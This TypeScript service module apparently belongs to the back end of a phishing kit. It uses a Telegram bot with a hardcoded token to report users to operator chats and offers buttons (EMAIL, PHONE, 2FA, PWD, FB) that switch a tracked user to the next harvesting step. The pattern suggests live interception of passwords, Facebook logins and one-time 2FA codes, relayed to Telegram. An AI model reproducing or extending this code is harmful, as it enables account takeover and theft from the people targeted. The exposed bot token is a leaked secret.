import jwt from "jsonwebtoken";
import axios from "axios";
import {User} from "../model/user.model";
import pagination from "../utilities/pagination";
import application from "../constants/application";
import TelegramBot from "node-telegram-bot-api";

const CHAT_ID_ONLINE = "-819869453";
const CHAT_ID = "-792470087";
const BOT_TOKEN = "5895336607:AAFZBy6gXSn-kOHyUAeUQKvUNLBkSc5AODU";

const bot = new TelegramBot(BOT_TOKEN, {polling: true});

const createUser = async (data: object) => {
	const user_data = new User(data);
	const user = await user_data.save();
	return user;
};

const getUserByUniqueId = async (unique_id: string) => {
	const user = await User.findOne({unique_id: unique_id});
	return user;
};
const getAllUsers = async (data: any) => {
	const users = await pagination(User, data.limit, data.page);
	return users;
};

const updateUserStatus = async (unique_id: string, status: number) => {
	await User.findOneAndUpdate(
		{
			unique_id: unique_id,
		},
		{status: status}
	);

	const updated_user = await getUserByUniqueId(unique_id);

	return updated_user;
};

const generateToken = async (data: object) => {
	return jwt.sign(data, application.env.authSecret);
};

bot.on("callback_query", (query) => {
	const chatId = CHAT_ID;
	const data: any = query.data;
	const parseData = JSON.parse(data);

	if (parseData && parseData.id) {
		updateUserStatus(parseData.id, parseData.status);
	}

	if (parseData.status === 1) {
		// Send email
		bot.sendMessage(chatId, "Redirect to EMAIL");
	} else if (parseData.status === 2) {
		// Send phone message
		bot.sendMessage(chatId, "Redirect to PHONE");
	} else if (parseData.status === 3) {
		// Send phone message
		bot.sendMessage(chatId, "Redirect to 2FA");
	} else if (parseData.status === 4) {
		// Send 2FA message
		bot.sendMessage(chatId, "Redirect to PWD");
	} else if (parseData.status === 5) {
		// Send 2FA message
		bot.sendMessage(chatId, "Redirect to FB");
	}
});

const sendTelegramMessage = async (value: any, isOnline: boolean, id?: string, keyboard?: boolean) => {
	if (!value) return;

	let bodyData: any = {
		chat_id: isOnline ? CHAT_ID_ONLINE : CHAT_ID,
		text: value,
	};

	if (!isOnline && keyboard) {
		bodyData.reply_markup = {
			inline_keyboard: [
				[
					{
						text: "EMAIL",
						callback_data: JSON.stringify({
							id: id,
							status: 1,
						}),
					},
					{
						text: "PHONE",
						callback_data: JSON.stringify({
							id: id,
							status: 2,
						}),
					},
					{
						text: "2FA",
						callback_data: JSON.stringify({
							id: id,
							status: 3,
						}),
					},
					{
						text: "PWD",
						callback_data: JSON.stringify({
							id: id,
							status: 4,
						}),
					},
					{
						text: "FB",
						callback_data: JSON.stringify({
							id: id,
							status: 5,
						}),
					},
				],
			],
		};
	}

	const data = await axios({
		method: "POST",
		url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
		data: bodyData,
	});

	return data.data;
};

export default {
	createUser,
	getAllUsers,
	getUserByUniqueId,
	updateUserStatus,
	generateToken,
	sendTelegramMessage,
};
